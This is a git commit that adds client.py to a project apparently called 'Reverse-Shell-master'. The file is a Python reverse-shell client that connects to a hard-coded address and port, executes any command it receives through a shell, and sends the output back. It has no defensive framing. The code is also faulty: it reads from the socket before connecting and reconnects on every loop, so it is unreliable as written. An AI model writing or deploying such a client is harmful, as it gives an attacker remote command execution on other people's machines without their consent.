03064ddf63e5c13f5f67cc1245f706fdee4e978f
aidinazari <70124488+aidinazari@users.noreply.github.com>
2020-10-07 09:56:57 +0330

    Add files via upload

---
+++ Reverse-Shell-master/Multi_Client ( ReverseShell v2)/client.py
@@ -0,0 +1,22 @@
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = '192.168.1.109'
+port = 9999
+
+while True:
+    data = s.recv(1024)
+    s.connect((host, port))
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
+
+        print(output_str)
